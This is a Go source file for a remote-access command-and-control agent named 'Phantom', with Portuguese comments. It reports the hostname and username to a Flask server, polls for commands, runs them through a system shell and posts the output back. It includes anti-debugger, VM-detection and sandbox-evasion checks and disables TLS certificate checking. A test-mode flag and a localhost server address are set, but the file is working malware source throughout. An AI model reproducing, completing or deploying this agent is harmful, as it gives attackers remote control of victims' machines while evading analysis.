package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

// Configurações
var (
    flaskURL = "http://localhost:5000"
    uuid     = generateUUID()
    testMode = true // Permite execução em ambientes de teste
)

// Estruturas para comunicação com Flask
type StatusReport struct {
    Hostname string `json:"hostname"`
    Username string `json:"username"`
    IP       string `json:"ip"`
    OS       string `json:"os"`
    Time     int64  `json:"time"`
}

type CommandResponse struct {
    Command string `json:"command"`
}

type OutputReport struct {
    Hostname string `json:"hostname"`
    Command  string `json:"command"`
    Output   string `json:"output"`
    Time     int64  `json:"time"`
}

type HeartbeatReport struct {
    Hostname string `json:"hostname"`
    Time     int64  `json:"time"`
}

func antiDebugCheck() bool {
    if testMode {
        fmt.Println("[TEST] Anti-debug check bypassed for testing")
        return false
    }
    
    if runtime.GOOS == "linux" {
        status, err := ioutil.ReadFile("/proc/self/status")
        if err == nil {
            statusStr := string(status)
            lines := strings.Split(statusStr, "\n")
            for _, line := range lines {
                if strings.HasPrefix(line, "TracerPid:") {
                    parts := strings.Fields(line)
                    if len(parts) > 1 && parts[1] != "0" {
                        return true
                    }
                }
            }
        }
    }
    return false
}

func vmDetection() bool {
    if testMode {
        fmt.Println("[TEST] VM detection bypassed for testing")
        return false
    }
    
    vmFiles := []string{
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/proc/cpuinfo",
    }
    
    vmIndicators := []string{
        "vmware", "virtualbox", "qemu", "kvm", "xen", 
        "hyper-v", "virtual", "bochs",
    }
    
    for _, path := range vmFiles {
        if data, err := ioutil.ReadFile(path); err == nil {
            content := strings.ToLower(string(data))
            for _, indicator := range vmIndicators {
                if strings.Contains(content, indicator) {
                    fmt.Printf("[!] VM indicator detected: %s\n", indicator)
                    return true
                }
            }
        }
    }
    
    return false
}

func sandboxEvasion() bool {
    if testMode {
        fmt.Println("[TEST] Sandbox evasion bypassed for testing")
        return false
    }
    
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    user = strings.ToLower(user)
    
    sandboxUsers := []string{
        "sandbox", "malware", "virus", "sample", "test",
        "analyst", "reversing",
    }
    
    for _, sbUser := range sandboxUsers {
        if strings.Contains(user, sbUser) {
            return true
        }
    }
    
    return false
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    fmt.Println("[+] Phantom Advanced C2 Agent")
    fmt.Println("[+] Mode: Test Environment")
    fmt.Println("[+] Iniciando verificações de evasão...")
    
    // Verificações de evasão (modo teste)
    if antiDebugCheck() {
        fmt.Println("[-] Debugger detectado. Encerrando.")
        os.Exit(0)
    }
    
    if vmDetection() {
        fmt.Println("[!] VM detectada. Aplicando delay mínimo...")
        time.Sleep(2 * time.Second)
    }
    
    if sandboxEvasion() {
        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
        os.Exit(0)
    }
    
    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
    
    // Checkin inicial
    if !checkin() {
        fmt.Println("[-] Falha no checkin inicial")
        os.Exit(1)
    }
    
    fmt.Println("[+] Checkin realizado com sucesso!")
    fmt.Println("[+] Agente operacional. Entrando em loop principal...")
    
    // Loop principal
    for {
        command := getCommand()
        if command != "" {
            fmt.Printf("[+] Comando recebido: %s\n", command)
            
            if command == "exit" {
                fmt.Println("[+] Comando de saída recebido. Encerrando.")
                break
            }
            
            output := executeCommand(command)
            sendOutput(command, output)
        }
        
        sendHeartbeat()
        sleepWithJitter()
    }
}

func checkin() bool {
    client := createHTTPClient()
    
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    report := StatusReport{
        Hostname: hostname,
        Username: user,
        IP:       getLocalIP(),
        OS:       runtime.GOOS,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(report)
    
    resp, err := client.Post(flaskURL+"/api/report_status", 
                            "application/json", 
                            bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("[-] Erro no checkin: %v\n", err)
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getCommand() string {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    resp, err := client.Get(fmt.Sprintf("%s/api/get_command?hostname=%s", flaskURL, hostname))
    if err != nil {
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    
    var cmdResp CommandResponse
    if err := json.Unmarshal(body, &cmdResp); err != nil {
        return ""
    }
    
    return cmdResp.Command
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.Output()
    if err != nil {
        return fmt.Sprintf("Erro: %v", err)
    }
    
    return string(output)
}

func sendOutput(command, output string) {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    report := OutputReport{
        Hostname: hostname,
        Command:  command,
        Output:   output,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(report)
    
    client.Post(flaskURL+"/api/report_output", 
               "application/json", 
               bytes.NewBuffer(jsonData))
}

func sendHeartbeat() {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    heartbeat := HeartbeatReport{
        Hostname: hostname,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(heartbeat)
    
    client.Post(flaskURL+"/api/heartbeat", 
               "application/json", 
               bytes.NewBuffer(jsonData))
}

func createHTTPClient() *http.Client {
    return &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 10 * time.Second,
    }
}

func getLocalIP() string {
    return "127.0.0.1"
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sleepWithJitter() {
    base := 5 * time.Second
    jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
    time.Sleep(base + jitter)
}